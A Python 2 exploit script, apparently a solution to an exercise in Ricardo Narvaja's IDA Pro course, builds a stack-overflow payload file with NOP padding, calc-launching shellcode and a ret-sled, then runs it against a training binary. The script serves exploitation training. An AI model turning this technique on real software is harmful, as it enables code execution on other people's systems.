# Python 2.7 x86
# Solution for auto evaluation: Level 12
# Curso IDA Pro de Ricardo Narvaja.
# by @rextco
import string
import random
import os
import struct


def read_file(file_name):
    with open(file_name, "rb") as f:
        content = f.read()
    return bytearray(content)


def write_file(file_name, content):
    with open(file_name, "wb") as f:
        f.write(content)


def random_word(length):
    letters = string.ascii_uppercase
    return "".join(random.choice(letters) for char in range(length))


def read_pipe(ptr_buf):
    buf = ""
    while True:
        line = ptr_buf.readline()
        buf += line
        if "#string" in line:      # simple way to to stop reading pipe
            break
    return buf


def make_file():
    print("Exploit!Generate!File")

    shell = "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xFF\x15\x70\x20\x40\x00\x51\xFF\x15\x74\x20\x40\x00\xC3"
    # XOR ECX, ECX
    # PUSH ECX
    # PUSH 0x636c6163
    # PUSH ESP
    # CALL [0x00402070]   ; ptr_system
    # PUSH ECX
    # CALL [0x00402074]   ; ptr_exit
    # RET

    # Setup
    stuff = ""
    stuff += "\x90" * 199
    stuff += "\x00"                             # The trick
    stuff += "\x90" * (0x230 - len(stuff))      # padding
    stuff += shell
    stuff += "\x90" * (620 - len(stuff))        # cuadrando la direccion de retorno
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret | Los rets son para pisar la parte baja del stack
    stuff += struct.pack("<L", 0x004019FA)      # ret | La shell code estara en el stack
    stuff += struct.pack("<L", 0x004019FA)      # ret | Se puede alterar solo el ultimo byte
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += struct.pack("<L", 0x004019FA)      # ret
    stuff += "\x00"                             # pisar parte baja de la direccion del stack

    write_file("bad_food.txt", stuff)
    print("length = {:d}".format(len(stuff)))


def exploit():
    print("Exploit!Subprocess!Call")
    arg_0 = "level-12.exe"
    arg_1 = "bad_food.txt"
    arg_2 = ""
    stdin, stdout = os.popen4("{:s} {:s} {:s}".format(arg_0, arg_1, arg_2))
    # r = stdout.readline()
    # print r


if __name__ == "__main__":
    make_file()
    exploit()

# Work under: Windows 7
# MOV EAX, 0x403080
# MOV [EAX], 0x636c6163
# PUSH EAX
# CALL [0x00402070]     ; ptr_system
# PUSH 0
# CALL [0x00402074]     ; ptr_exit
# RET

